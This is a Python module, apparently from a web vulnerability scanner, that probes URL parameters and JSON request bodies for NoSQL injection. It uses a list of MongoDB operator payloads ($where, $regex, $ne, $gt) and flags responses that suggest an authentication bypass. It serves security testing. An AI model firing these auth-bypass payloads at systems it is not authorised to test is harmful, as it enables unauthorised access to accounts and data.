"""Advanced NoSQL: aggregation, $where, regex."""
from core.http import get, post
from core.findings import Finding
from core.memory import log_event
import urllib.parse, json

NOSQL_PAYLOADS = [
    '{"$where": "this.password.match(/.*/)"}',
    '{"$regex": ".*"}',
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
]

def scan_url(url):
    findings = []
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)
    test_params = list(qs.keys()) if qs else []
    for param in test_params:
        for payload in NOSQL_PAYLOADS:
            q = dict(qs); q[param] = [payload]
            new_url = parsed._replace(query=urllib.parse.urlencode(q, doseq=True)).geturl()
            r = get(new_url)
            if r.status != 0 and r.status in (200,):
                # check if auth bypassed (different from baseline)
                base = get(url)
                if base.text != r.text and "welcome" in (r.text or "").lower():
                    findings.append(Finding(
                        id="nosql-adv-{}-{}".format(param, hash(url) & 0xffff),
                        target=parsed.netloc,
                        type="NoSQL Injection (auth bypass)",
                        severity="high",
                        url=new_url,
                        parameter=param,
                        payload=payload,
                        evidence="Authentication bypassed",
                        response_snippet=r.snippet(300),
                        confidence=0.6,
                    ))
                    break
    # JSON body
    for payload in NOSQL_PAYLOADS[:3]:
        try:
            resp = post(url, json=json.loads(payload), headers={"Content-Type": "application/json"})
            if resp.status != 0 and resp.status in (200,):
                findings.append(Finding(
                    id="nosql-json-{}".format(hash(url+payload) & 0xffff),
                    target=parsed.netloc,
                    type="NoSQL Injection (JSON)",
                    severity="high",
                    url=url,
                    parameter="body",
                    payload=payload,
                    evidence="NoSQL operator accepted in JSON",
                    response_snippet=resp.snippet(300),
                    confidence=0.5,
                ))
                break
        except Exception:
            pass
    log_event(parsed.netloc, "nosql_advanced_scan", {"url": url, "findings": len(findings)})
    return findings
